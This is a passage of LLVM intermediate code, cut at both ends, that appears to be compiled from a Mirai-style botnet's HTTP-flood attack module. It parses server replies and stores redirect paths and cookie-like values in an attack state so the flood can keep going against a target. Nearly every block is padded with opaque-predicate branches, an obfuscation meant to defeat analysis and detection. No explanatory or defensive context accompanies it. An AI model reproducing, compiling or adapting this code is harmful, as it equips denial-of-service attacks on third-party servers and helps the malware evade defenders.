  %2064 = getelementptr inbounds i8, i8* %2061, i64 %2063
  %2065 = load i32, i32* %47, align 4
  %2066 = sext i32 %2065 to i64
  %2067 = getelementptr inbounds i8, i8* %2064, i64 %2066
  %2068 = load i32, i32* %12, align 4
  %2069 = load i32, i32* %37, align 4
  %2070 = sub nsw i32 %2068, %2069
  %2071 = load i32, i32* %47, align 4
  %2072 = sub nsw i32 %2070, %2071
  %2073 = call i32 @util_memsearch(i8* %2067, i32 %2072, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %2074 = sub nsw i32 %2073, 1
  store i32 %2074, i32* %48, align 4
  br label %2075

; <label>:2075:                                   ; preds = %2060, %2045
  %2076 = load i32, i32* %37, align 4
  %2077 = load i32, i32* %47, align 4
  %2078 = add nsw i32 %2076, %2077
  %2079 = load i32, i32* %48, align 4
  %2080 = add nsw i32 %2078, %2079
  %2081 = sext i32 %2080 to i64
  %2082 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %2081
  store i8 0, i8* %2082, align 1
  store i32 0, i32* %10, align 4
  br label %2083

; <label>:2083:                                   ; preds = %originalBBpart2279, %2075
  %2084 = load i32, i32* %10, align 4
  %2085 = load i8*, i8** %49, align 8
  %2086 = call i32 @util_strlen(i8* %2085)
  %2087 = icmp slt i32 %2084, %2086
  br i1 %2087, label %2088, label %2133

; <label>:2088:                                   ; preds = %2083
  %2089 = load i8*, i8** %49, align 8
  %2090 = load i32, i32* %10, align 4
  %2091 = sext i32 %2090 to i64
  %2092 = getelementptr inbounds i8, i8* %2089, i64 %2091
  %2093 = load i8, i8* %2092, align 1
  %2094 = sext i8 %2093 to i32
  %2095 = icmp eq i32 %2094, 61
  br i1 %2095, label %2096, label %2113

; <label>:2096:                                   ; preds = %2088
  %2097 = load i32, i32* @x.17
  %2098 = load i32, i32* @y.18
  %2099 = sub i32 %2097, 1
  %2100 = mul i32 %2097, %2099
  %2101 = urem i32 %2100, 2
  %2102 = icmp eq i32 %2101, 0
  %2103 = icmp slt i32 %2098, 10
  %2104 = or i1 %2102, %2103
  br i1 %2104, label %originalBB264, label %originalBB264alteredBB

originalBB264:                                    ; preds = %originalBB264alteredBB, %2096
  %2105 = load i32, i32* @x.17
  %2106 = load i32, i32* @y.18
  %2107 = sub i32 %2105, 1
  %2108 = mul i32 %2105, %2107
  %2109 = urem i32 %2108, 2
  %2110 = icmp eq i32 %2109, 0
  %2111 = icmp slt i32 %2106, 10
  %2112 = or i1 %2110, %2111
  br i1 %2112, label %originalBBpart2266, label %originalBB264alteredBB

originalBBpart2266:                               ; preds = %originalBB264
  br label %2133

; <label>:2113:                                   ; preds = %2088
  br label %2114

; <label>:2114:                                   ; preds = %2113
  %2115 = load i32, i32* @x.17
  %2116 = load i32, i32* @y.18
  %2117 = sub i32 %2115, 1
  %2118 = mul i32 %2115, %2117
  %2119 = urem i32 %2118, 2
  %2120 = icmp eq i32 %2119, 0
  %2121 = icmp slt i32 %2116, 10
  %2122 = or i1 %2120, %2121
  br i1 %2122, label %originalBB268, label %originalBB268alteredBB

originalBB268:                                    ; preds = %originalBB268alteredBB, %2114
  %2123 = load i32, i32* %10, align 4
  %2124 = add nsw i32 %2123, 1
  store i32 %2124, i32* %10, align 4
  %2125 = load i32, i32* @x.17
  %2126 = load i32, i32* @y.18
  %2127 = sub i32 %2125, 1
  %2128 = mul i32 %2125, %2127
  %2129 = urem i32 %2128, 2
  %2130 = icmp eq i32 %2129, 0
  %2131 = icmp slt i32 %2126, 10
  %2132 = or i1 %2130, %2131
  br i1 %2132, label %originalBBpart2279, label %originalBB268alteredBB

originalBBpart2279:                               ; preds = %originalBB268
  br label %2083

; <label>:2133:                                   ; preds = %originalBBpart2266, %2083
  %2134 = load i32, i32* @x.17
  %2135 = load i32, i32* @y.18
  %2136 = sub i32 %2134, 1
  %2137 = mul i32 %2134, %2136
  %2138 = urem i32 %2137, 2
  %2139 = icmp eq i32 %2138, 0
  %2140 = icmp slt i32 %2135, 10
  %2141 = or i1 %2139, %2140
  br i1 %2141, label %originalBB281, label %originalBB281alteredBB

originalBB281:                                    ; preds = %originalBB281alteredBB, %2133
  %2142 = load i8*, i8** %49, align 8
  %2143 = load i32, i32* %10, align 4
  %2144 = sext i32 %2143 to i64
  %2145 = getelementptr inbounds i8, i8* %2142, i64 %2144
  %2146 = load i8, i8* %2145, align 1
  %2147 = sext i8 %2146 to i32
  %2148 = icmp eq i32 %2147, 61
  %2149 = load i32, i32* @x.17
  %2150 = load i32, i32* @y.18
  %2151 = sub i32 %2149, 1
  %2152 = mul i32 %2149, %2151
  %2153 = urem i32 %2152, 2
  %2154 = icmp eq i32 %2153, 0
  %2155 = icmp slt i32 %2150, 10
  %2156 = or i1 %2154, %2155
  br i1 %2156, label %originalBBpart2283, label %originalBB281alteredBB

originalBBpart2283:                               ; preds = %originalBB281
  br i1 %2148, label %2157, label %2285

; <label>:2157:                                   ; preds = %originalBBpart2283
  %2158 = load i32, i32* @x.17
  %2159 = load i32, i32* @y.18
  %2160 = sub i32 %2158, 1
  %2161 = mul i32 %2158, %2160
  %2162 = urem i32 %2161, 2
  %2163 = icmp eq i32 %2162, 0
  %2164 = icmp slt i32 %2159, 10
  %2165 = or i1 %2163, %2164
  br i1 %2165, label %originalBB285, label %originalBB285alteredBB

originalBB285:                                    ; preds = %originalBB285alteredBB, %2157
  %2166 = load i32, i32* %10, align 4
  store i32 %2166, i32* %50, align 4
  store i32 0, i32* %51, align 4
  store i32 0, i32* %10, align 4
  %2167 = load i32, i32* @x.17
  %2168 = load i32, i32* @y.18
  %2169 = sub i32 %2167, 1
  %2170 = mul i32 %2167, %2169
  %2171 = urem i32 %2170, 2
  %2172 = icmp eq i32 %2171, 0
  %2173 = icmp slt i32 %2168, 10
  %2174 = or i1 %2172, %2173
  br i1 %2174, label %originalBBpart2287, label %originalBB285alteredBB

originalBBpart2287:                               ; preds = %originalBB285
  br label %2175

; <label>:2175:                                   ; preds = %2226, %originalBBpart2287
  %2176 = load i32, i32* %10, align 4
  %2177 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2178 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2177, i32 0, i32 15
  %2179 = load i32, i32* %2178, align 4
  %2180 = icmp slt i32 %2176, %2179
  br i1 %2180, label %2181, label %2229

; <label>:2181:                                   ; preds = %2175
  %2182 = load i8*, i8** %49, align 8
  %2183 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2184 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2183, i32 0, i32 16
  %2185 = load i32, i32* %10, align 4
  %2186 = sext i32 %2185 to i64
  %2187 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2184, i64 0, i64 %2186
  %2188 = getelementptr inbounds [128 x i8], [128 x i8]* %2187, i32 0, i32 0
  %2189 = load i32, i32* %50, align 4
  %2190 = call signext i8 @util_strncmp(i8* %2182, i8* %2188, i32 %2189)
  %2191 = icmp ne i8 %2190, 0
  br i1 %2191, label %2192, label %2209

; <label>:2192:                                   ; preds = %2181
  %2193 = load i32, i32* @x.17
  %2194 = load i32, i32* @y.18
  %2195 = sub i32 %2193, 1
  %2196 = mul i32 %2193, %2195
  %2197 = urem i32 %2196, 2
  %2198 = icmp eq i32 %2197, 0
  %2199 = icmp slt i32 %2194, 10
  %2200 = or i1 %2198, %2199
  br i1 %2200, label %originalBB289, label %originalBB289alteredBB

originalBB289:                                    ; preds = %originalBB289alteredBB, %2192
  store i32 1, i32* %51, align 4
  %2201 = load i32, i32* @x.17
  %2202 = load i32, i32* @y.18
  %2203 = sub i32 %2201, 1
  %2204 = mul i32 %2201, %2203
  %2205 = urem i32 %2204, 2
  %2206 = icmp eq i32 %2205, 0
  %2207 = icmp slt i32 %2202, 10
  %2208 = or i1 %2206, %2207
  br i1 %2208, label %originalBBpart2291, label %originalBB289alteredBB

originalBBpart2291:                               ; preds = %originalBB289
  br label %2229

; <label>:2209:                                   ; preds = %2181
  %2210 = load i32, i32* @x.17
  %2211 = load i32, i32* @y.18
  %2212 = sub i32 %2210, 1
  %2213 = mul i32 %2210, %2212
  %2214 = urem i32 %2213, 2
  %2215 = icmp eq i32 %2214, 0
  %2216 = icmp slt i32 %2211, 10
  %2217 = or i1 %2215, %2216
  br i1 %2217, label %originalBB293, label %originalBB293alteredBB

originalBB293:                                    ; preds = %originalBB293alteredBB, %2209
  %2218 = load i32, i32* @x.17
  %2219 = load i32, i32* @y.18
  %2220 = sub i32 %2218, 1
  %2221 = mul i32 %2218, %2220
  %2222 = urem i32 %2221, 2
  %2223 = icmp eq i32 %2222, 0
  %2224 = icmp slt i32 %2219, 10
  %2225 = or i1 %2223, %2224
  br i1 %2225, label %originalBBpart2295, label %originalBB293alteredBB

originalBBpart2295:                               ; preds = %originalBB293
  br label %2226

; <label>:2226:                                   ; preds = %originalBBpart2295
  %2227 = load i32, i32* %10, align 4
  %2228 = add nsw i32 %2227, 1
  store i32 %2228, i32* %10, align 4
  br label %2175

; <label>:2229:                                   ; preds = %originalBBpart2291, %2175
  %2230 = load i32, i32* @x.17
  %2231 = load i32, i32* @y.18
  %2232 = sub i32 %2230, 1
  %2233 = mul i32 %2230, %2232
  %2234 = urem i32 %2233, 2
  %2235 = icmp eq i32 %2234, 0
  %2236 = icmp slt i32 %2231, 10
  %2237 = or i1 %2235, %2236
  br i1 %2237, label %originalBB297, label %originalBB297alteredBB

originalBB297:                                    ; preds = %originalBB297alteredBB, %2229
  %2238 = load i32, i32* %51, align 4
  %2239 = icmp ne i32 %2238, 0
  %2240 = load i32, i32* @x.17
  %2241 = load i32, i32* @y.18
  %2242 = sub i32 %2240, 1
  %2243 = mul i32 %2240, %2242
  %2244 = urem i32 %2243, 2
  %2245 = icmp eq i32 %2244, 0
  %2246 = icmp slt i32 %2241, 10
  %2247 = or i1 %2245, %2246
  br i1 %2247, label %originalBBpart2299, label %originalBB297alteredBB

originalBBpart2299:                               ; preds = %originalBB297
  br i1 %2239, label %2284, label %2248

; <label>:2248:                                   ; preds = %originalBBpart2299
  %2249 = load i8*, i8** %49, align 8
  %2250 = call i32 @util_strlen(i8* %2249)
  %2251 = icmp slt i32 %2250, 128
  br i1 %2251, label %2252, label %2267

; <label>:2252:                                   ; preds = %2248
  %2253 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2254 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2253, i32 0, i32 16
  %2255 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2256 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2255, i32 0, i32 15
  %2257 = load i32, i32* %2256, align 4
  %2258 = sext i32 %2257 to i64
  %2259 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2254, i64 0, i64 %2258
  %2260 = getelementptr inbounds [128 x i8], [128 x i8]* %2259, i32 0, i32 0
  %2261 = load i8*, i8** %49, align 8
  %2262 = call i32 @util_strcpy(i8* %2260, i8* %2261)
  %2263 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2264 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2263, i32 0, i32 15
  %2265 = load i32, i32* %2264, align 4
  %2266 = add nsw i32 %2265, 1
  store i32 %2266, i32* %2264, align 4
  br label %2267

; <label>:2267:                                   ; preds = %2252, %2248
  %2268 = load i32, i32* @x.17
  %2269 = load i32, i32* @y.18
  %2270 = sub i32 %2268, 1
  %2271 = mul i32 %2268, %2270
  %2272 = urem i32 %2271, 2
  %2273 = icmp eq i32 %2272, 0
  %2274 = icmp slt i32 %2269, 10
  %2275 = or i1 %2273, %2274
  br i1 %2275, label %originalBB301, label %originalBB301alteredBB

originalBB301:                                    ; preds = %originalBB301alteredBB, %2267
  %2276 = load i32, i32* @x.17
  %2277 = load i32, i32* @y.18
  %2278 = sub i32 %2276, 1
  %2279 = mul i32 %2276, %2278
  %2280 = urem i32 %2279, 2
  %2281 = icmp eq i32 %2280, 0
  %2282 = icmp slt i32 %2277, 10
  %2283 = or i1 %2281, %2282
  br i1 %2283, label %originalBBpart2303, label %originalBB301alteredBB

originalBBpart2303:                               ; preds = %originalBB301
  br label %2284

; <label>:2284:                                   ; preds = %originalBBpart2303, %originalBBpart2299
  br label %2285

; <label>:2285:                                   ; preds = %2284, %originalBBpart2283
  br label %2286

; <label>:2286:                                   ; preds = %2285, %2002
  %2287 = load i32, i32* %47, align 4
  %2288 = load i32, i32* %37, align 4
  %2289 = add nsw i32 %2288, %2287
  store i32 %2289, i32* %37, align 4
  br label %1967

; <label>:2290:                                   ; preds = %1981
  %2291 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2292 = load i32, i32* %12, align 4
  %2293 = call i8* @table_retrieve_val(i32 45, i32* null)
  %2294 = call i32 @util_stristr(i8* %2291, i32 %2292, i8* %2293)
  %2295 = icmp ne i32 %2294, -1
  br i1 %2295, label %2296, label %2635

; <label>:2296:                                   ; preds = %2290
  %2297 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2298 = load i32, i32* %12, align 4
  %2299 = call i8* @table_retrieve_val(i32 45, i32* null)
  %2300 = call i32 @util_stristr(i8* %2297, i32 %2298, i8* %2299)
  store i32 %2300, i32* %52, align 4
  %2301 = load i32, i32* %52, align 4
  %2302 = sext i32 %2301 to i64
  %2303 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %2302
  %2304 = load i8, i8* %2303, align 1
  %2305 = sext i8 %2304 to i32
  %2306 = icmp eq i32 %2305, 32
  br i1 %2306, label %2307, label %2326

; <label>:2307:                                   ; preds = %2296
  %2308 = load i32, i32* @x.17
  %2309 = load i32, i32* @y.18
  %2310 = sub i32 %2308, 1
  %2311 = mul i32 %2308, %2310
  %2312 = urem i32 %2311, 2
  %2313 = icmp eq i32 %2312, 0
  %2314 = icmp slt i32 %2309, 10
  %2315 = or i1 %2313, %2314
  br i1 %2315, label %originalBB305, label %originalBB305alteredBB

originalBB305:                                    ; preds = %originalBB305alteredBB, %2307
  %2316 = load i32, i32* %52, align 4
  %2317 = add nsw i32 %2316, 1
  store i32 %2317, i32* %52, align 4
  %2318 = load i32, i32* @x.17
  %2319 = load i32, i32* @y.18
  %2320 = sub i32 %2318, 1
  %2321 = mul i32 %2318, %2320
  %2322 = urem i32 %2321, 2
  %2323 = icmp eq i32 %2322, 0
  %2324 = icmp slt i32 %2319, 10
  %2325 = or i1 %2323, %2324
  br i1 %2325, label %originalBBpart2311, label %originalBB305alteredBB

originalBBpart2311:                               ; preds = %originalBB305
  br label %2326

; <label>:2326:                                   ; preds = %originalBBpart2311, %2296
  %2327 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2328 = load i32, i32* %52, align 4
  %2329 = sext i32 %2328 to i64
  %2330 = getelementptr inbounds i8, i8* %2327, i64 %2329
  %2331 = load i32, i32* %12, align 4
  %2332 = load i32, i32* %52, align 4
  %2333 = sub nsw i32 %2331, %2332
  %2334 = call i32 @util_memsearch(i8* %2330, i32 %2333, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %2334, i32* %53, align 4
  %2335 = load i32, i32* %53, align 4
  %2336 = icmp ne i32 %2335, -1
  br i1 %2336, label %2337, label %2634

; <label>:2337:                                   ; preds = %2326
  %2338 = load i32, i32* %52, align 4
  %2339 = sext i32 %2338 to i64
  %2340 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %2339
  store i8* %2340, i8** %54, align 8
  %2341 = load i32, i32* %53, align 4
  %2342 = icmp sge i32 %2341, 2
  br i1 %2342, label %2343, label %2346

; <label>:2343:                                   ; preds = %2337
  %2344 = load i32, i32* %53, align 4
  %2345 = sub nsw i32 %2344, 2
  store i32 %2345, i32* %53, align 4
  br label %2346

; <label>:2346:                                   ; preds = %2343, %2337
  %2347 = load i32, i32* @x.17
  %2348 = load i32, i32* @y.18
  %2349 = sub i32 %2347, 1
  %2350 = mul i32 %2347, %2349
  %2351 = urem i32 %2350, 2
  %2352 = icmp eq i32 %2351, 0
  %2353 = icmp slt i32 %2348, 10
  %2354 = or i1 %2352, %2353
  br i1 %2354, label %originalBB313, label %originalBB313alteredBB

originalBB313:                                    ; preds = %originalBB313alteredBB, %2346
  %2355 = load i32, i32* %52, align 4
  %2356 = load i32, i32* %53, align 4
  %2357 = add nsw i32 %2355, %2356
  %2358 = sext i32 %2357 to i64
  %2359 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %2358
  store i8 0, i8* %2359, align 1
  %2360 = load i32, i32* %53, align 4
  %2361 = add nsw i32 %2360, 1
  store i32 %2361, i32* %53, align 4
  %2362 = load i8*, i8** %54, align 8
  %2363 = load i32, i32* %53, align 4
  %2364 = call i32 @util_memsearch(i8* %2362, i32 %2363, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i32 0, i32 0), i32 4)
  %2365 = icmp eq i32 %2364, 4
  %2366 = load i32, i32* @x.17
  %2367 = load i32, i32* @y.18
  %2368 = sub i32 %2366, 1
  %2369 = mul i32 %2366, %2368
  %2370 = urem i32 %2369, 2
  %2371 = icmp eq i32 %2370, 0
  %2372 = icmp slt i32 %2367, 10
  %2373 = or i1 %2371, %2372
  br i1 %2373, label %originalBBpart2334, label %originalBB313alteredBB

originalBBpart2334:                               ; preds = %originalBB313
  br i1 %2365, label %2374, label %2528

; <label>:2374:                                   ; preds = %originalBBpart2334
  store i32 7, i32* %10, align 4
  %2375 = load i8*, i8** %54, align 8
  %2376 = getelementptr inbounds i8, i8* %2375, i64 4
  %2377 = load i8, i8* %2376, align 1
  %2378 = sext i8 %2377 to i32
  %2379 = icmp eq i32 %2378, 115
  br i1 %2379, label %2380, label %2383

; <label>:2380:                                   ; preds = %2374
  %2381 = load i32, i32* %10, align 4
  %2382 = add nsw i32 %2381, 1
  store i32 %2382, i32* %10, align 4
  br label %2383

; <label>:2383:                                   ; preds = %2380, %2374
  %2384 = load i32, i32* @x.17
  %2385 = load i32, i32* @y.18
  %2386 = sub i32 %2384, 1
  %2387 = mul i32 %2384, %2386
  %2388 = urem i32 %2387, 2
  %2389 = icmp eq i32 %2388, 0
  %2390 = icmp slt i32 %2385, 10
  %2391 = or i1 %2389, %2390
  br i1 %2391, label %originalBB336, label %originalBB336alteredBB

originalBB336:                                    ; preds = %originalBB336alteredBB, %2383
  %2392 = load i8*, i8** %54, align 8
  %2393 = load i8*, i8** %54, align 8
  %2394 = load i32, i32* %10, align 4
  %2395 = sext i32 %2394 to i64
  %2396 = getelementptr inbounds i8, i8* %2393, i64 %2395
  %2397 = load i32, i32* %53, align 4
  %2398 = load i32, i32* %10, align 4
  %2399 = sub nsw i32 %2397, %2398
  %2400 = sext i32 %2399 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %2392, i8* %2396, i64 %2400, i32 1, i1 false)
  store i32 0, i32* %10, align 4
  %2401 = load i32, i32* @x.17
  %2402 = load i32, i32* @y.18
  %2403 = sub i32 %2401, 1
  %2404 = mul i32 %2401, %2403
  %2405 = urem i32 %2404, 2
  %2406 = icmp eq i32 %2405, 0
  %2407 = icmp slt i32 %2402, 10
  %2408 = or i1 %2406, %2407
  br i1 %2408, label %originalBBpart2351, label %originalBB336alteredBB

originalBBpart2351:                               ; preds = %originalBB336
  br label %2409

; <label>:2409:                                   ; preds = %originalBBpart2363, %originalBBpart2351
  %2410 = load i8*, i8** %54, align 8
  %2411 = load i32, i32* %10, align 4
  %2412 = sext i32 %2411 to i64
  %2413 = getelementptr inbounds i8, i8* %2410, i64 %2412
  %2414 = load i8, i8* %2413, align 1
  %2415 = sext i8 %2414 to i32
  %2416 = icmp ne i32 %2415, 0
  br i1 %2416, label %2417, label %2449

; <label>:2417:                                   ; preds = %2409
  %2418 = load i8*, i8** %54, align 8
  %2419 = load i32, i32* %10, align 4
  %2420 = sext i32 %2419 to i64
  %2421 = getelementptr inbounds i8, i8* %2418, i64 %2420
  %2422 = load i8, i8* %2421, align 1
  %2423 = sext i8 %2422 to i32
  %2424 = icmp eq i32 %2423, 47
  br i1 %2424, label %2425, label %2430

; <label>:2425:                                   ; preds = %2417
  %2426 = load i8*, i8** %54, align 8
  %2427 = load i32, i32* %10, align 4
  %2428 = sext i32 %2427 to i64
  %2429 = getelementptr inbounds i8, i8* %2426, i64 %2428
  store i8 0, i8* %2429, align 1
  br label %2449

; <label>:2430:                                   ; preds = %2417
  %2431 = load i32, i32* @x.17
  %2432 = load i32, i32* @y.18
  %2433 = sub i32 %2431, 1
  %2434 = mul i32 %2431, %2433
  %2435 = urem i32 %2434, 2
  %2436 = icmp eq i32 %2435, 0
  %2437 = icmp slt i32 %2432, 10
  %2438 = or i1 %2436, %2437
  br i1 %2438, label %originalBB353, label %originalBB353alteredBB

originalBB353:                                    ; preds = %originalBB353alteredBB, %2430
  %2439 = load i32, i32* %10, align 4
  %2440 = add nsw i32 %2439, 1
  store i32 %2440, i32* %10, align 4
  %2441 = load i32, i32* @x.17
  %2442 = load i32, i32* @y.18
  %2443 = sub i32 %2441, 1
  %2444 = mul i32 %2441, %2443
  %2445 = urem i32 %2444, 2
  %2446 = icmp eq i32 %2445, 0
  %2447 = icmp slt i32 %2442, 10
  %2448 = or i1 %2446, %2447
  br i1 %2448, label %originalBBpart2363, label %originalBB353alteredBB

originalBBpart2363:                               ; preds = %originalBB353
  br label %2409

; <label>:2449:                                   ; preds = %2425, %2409
  %2450 = load i8*, i8** %54, align 8
  %2451 = call i32 @util_strlen(i8* %2450)
  %2452 = icmp sgt i32 %2451, 0
  br i1 %2452, label %2453, label %2479

; <label>:2453:                                   ; preds = %2449
  %2454 = load i32, i32* @x.17
  %2455 = load i32, i32* @y.18
  %2456 = sub i32 %2454, 1
  %2457 = mul i32 %2454, %2456
  %2458 = urem i32 %2457, 2
  %2459 = icmp eq i32 %2458, 0
  %2460 = icmp slt i32 %2455, 10
  %2461 = or i1 %2459, %2460
  br i1 %2461, label %originalBB365, label %originalBB365alteredBB

originalBB365:                                    ; preds = %originalBB365alteredBB, %2453
  %2462 = load i8*, i8** %54, align 8
  %2463 = call i32 @util_strlen(i8* %2462)
  %2464 = icmp slt i32 %2463, 128
  %2465 = load i32, i32* @x.17
  %2466 = load i32, i32* @y.18
  %2467 = sub i32 %2465, 1
  %2468 = mul i32 %2465, %2467
  %2469 = urem i32 %2468, 2
  %2470 = icmp eq i32 %2469, 0
  %2471 = icmp slt i32 %2466, 10
  %2472 = or i1 %2470, %2471
  br i1 %2472, label %originalBBpart2367, label %originalBB365alteredBB

originalBBpart2367:                               ; preds = %originalBB365
  br i1 %2464, label %2473, label %2479

; <label>:2473:                                   ; preds = %originalBBpart2367
  %2474 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2475 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2474, i32 0, i32 7
  %2476 = getelementptr inbounds [129 x i8], [129 x i8]* %2475, i32 0, i32 0
  %2477 = load i8*, i8** %54, align 8
  %2478 = call i32 @util_strcpy(i8* %2476, i8* %2477)
  br label %2479

; <label>:2479:                                   ; preds = %2473, %originalBBpart2367, %2449
  %2480 = load i8*, i8** %54, align 8
  %2481 = load i32, i32* %10, align 4
  %2482 = add nsw i32 %2481, 1
  %2483 = sext i32 %2482 to i64
  %2484 = getelementptr inbounds i8, i8* %2480, i64 %2483
  %2485 = call i32 @util_strlen(i8* %2484)
  %2486 = icmp slt i32 %2485, 256
  br i1 %2486, label %2487, label %2527

; <label>:2487:                                   ; preds = %2479
  %2488 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2489 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2488, i32 0, i32 6
  %2490 = getelementptr inbounds [257 x i8], [257 x i8]* %2489, i32 0, i32 0
  %2491 = getelementptr inbounds i8, i8* %2490, i64 1
  call void @util_zero(i8* %2491, i32 255)
  %2492 = load i8*, i8** %54, align 8
  %2493 = load i32, i32* %10, align 4
  %2494 = add nsw i32 %2493, 1
  %2495 = sext i32 %2494 to i64
  %2496 = getelementptr inbounds i8, i8* %2492, i64 %2495
  %2497 = call i32 @util_strlen(i8* %2496)
  %2498 = icmp sgt i32 %2497, 0
  br i1 %2498, label %2499, label %2510

; <label>:2499:                                   ; preds = %2487
  %2500 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2501 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2500, i32 0, i32 6
  %2502 = getelementptr inbounds [257 x i8], [257 x i8]* %2501, i32 0, i32 0
  %2503 = getelementptr inbounds i8, i8* %2502, i64 1
  %2504 = load i8*, i8** %54, align 8
  %2505 = load i32, i32* %10, align 4
  %2506 = add nsw i32 %2505, 1
  %2507 = sext i32 %2506 to i64
  %2508 = getelementptr inbounds i8, i8* %2504, i64 %2507
  %2509 = call i32 @util_strcpy(i8* %2503, i8* %2508)
  br label %2510

; <label>:2510:                                   ; preds = %2499, %2487
  %2511 = load i32, i32* @x.17
  %2512 = load i32, i32* @y.18
  %2513 = sub i32 %2511, 1
  %2514 = mul i32 %2511, %2513
  %2515 = urem i32 %2514, 2
  %2516 = icmp eq i32 %2515, 0
  %2517 = icmp slt i32 %2512, 10
  %2518 = or i1 %2516, %2517
  br i1 %2518, label %originalBB369, label %originalBB369alteredBB

originalBB369:                                    ; preds = %originalBB369alteredBB, %2510
  %2519 = load i32, i32* @x.17
  %2520 = load i32, i32* @y.18
  %2521 = sub i32 %2519, 1
  %2522 = mul i32 %2519, %2521
  %2523 = urem i32 %2522, 2
  %2524 = icmp eq i32 %2523, 0
  %2525 = icmp slt i32 %2520, 10
  %2526 = or i1 %2524, %2525
  br i1 %2526, label %originalBBpart2371, label %originalBB369alteredBB

originalBBpart2371:                               ; preds = %originalBB369
  br label %2527

; <label>:2527:                                   ; preds = %originalBBpart2371, %2479
  br label %2615

; <label>:2528:                                   ; preds = %originalBBpart2334
  %2529 = load i8*, i8** %54, align 8
  %2530 = getelementptr inbounds i8, i8* %2529, i64 0
  %2531 = load i8, i8* %2530, align 1
  %2532 = sext i8 %2531 to i32
  %2533 = icmp eq i32 %2532, 47
  br i1 %2533, label %2534, label %2598

; <label>:2534:                                   ; preds = %2528
  %2535 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2536 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2535, i32 0, i32 6
  %2537 = getelementptr inbounds [257 x i8], [257 x i8]* %2536, i32 0, i32 0
  %2538 = getelementptr inbounds i8, i8* %2537, i64 1
  call void @util_zero(i8* %2538, i32 255)
  %2539 = load i8*, i8** %54, align 8
  %2540 = load i32, i32* %10, align 4
  %2541 = add nsw i32 %2540, 1
  %2542 = sext i32 %2541 to i64
  %2543 = getelementptr inbounds i8, i8* %2539, i64 %2542
  %2544 = call i32 @util_strlen(i8* %2543)
  %2545 = icmp sgt i32 %2544, 0
  br i1 %2545, label %2546, label %2581

; <label>:2546:                                   ; preds = %2534
  %2547 = load i8*, i8** %54, align 8
  %2548 = load i32, i32* %10, align 4
  %2549 = add nsw i32 %2548, 1
  %2550 = sext i32 %2549 to i64
  %2551 = getelementptr inbounds i8, i8* %2547, i64 %2550
  %2552 = call i32 @util_strlen(i8* %2551)
  %2553 = icmp slt i32 %2552, 256
  br i1 %2553, label %2554, label %2581

; <label>:2554:                                   ; preds = %2546
  %2555 = load i32, i32* @x.17
  %2556 = load i32, i32* @y.18
  %2557 = sub i32 %2555, 1
  %2558 = mul i32 %2555, %2557
  %2559 = urem i32 %2558, 2
  %2560 = icmp eq i32 %2559, 0
  %2561 = icmp slt i32 %2556, 10
  %2562 = or i1 %2560, %2561
  br i1 %2562, label %originalBB373, label %originalBB373alteredBB

originalBB373:                                    ; preds = %originalBB373alteredBB, %2554
  %2563 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2564 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2563, i32 0, i32 6
  %2565 = getelementptr inbounds [257 x i8], [257 x i8]* %2564, i32 0, i32 0
  %2566 = getelementptr inbounds i8, i8* %2565, i64 1
  %2567 = load i8*, i8** %54, align 8
  %2568 = load i32, i32* %10, align 4
  %2569 = add nsw i32 %2568, 1
  %2570 = sext i32 %2569 to i64
  %2571 = getelementptr inbounds i8, i8* %2567, i64 %2570
  %2572 = call i32 @util_strcpy(i8* %2566, i8* %2571)
  %2573 = load i32, i32* @x.17
  %2574 = load i32, i32* @y.18
  %2575 = sub i32 %2573, 1
  %2576 = mul i32 %2573, %2575
  %2577 = urem i32 %2576, 2
  %2578 = icmp eq i32 %2577, 0
  %2579 = icmp slt i32 %2574, 10
  %2580 = or i1 %2578, %2579
  br i1 %2580, label %originalBBpart2379, label %originalBB373alteredBB

originalBBpart2379:                               ; preds = %originalBB373
  br label %2581

; <label>:2581:                                   ; preds = %originalBBpart2379, %2546, %2534
  %2582 = load i32, i32* @x.17
  %2583 = load i32, i32* @y.18
  %2584 = sub i32 %2582, 1
  %2585 = mul i32 %2582, %2584
  %2586 = urem i32 %2585, 2
  %2587 = icmp eq i32 %2586, 0
  %2588 = icmp slt i32 %2583, 10
  %2589 = or i1 %2587, %2588
  br i1 %2589, label %originalBB381, label %originalBB381alteredBB

originalBB381:                                    ; preds = %originalBB381alteredBB, %2581
  %2590 = load i32, i32* @x.17
  %2591 = load i32, i32* @y.18
  %2592 = sub i32 %2590, 1
  %2593 = mul i32 %2590, %2592
  %2594 = urem i32 %2593, 2
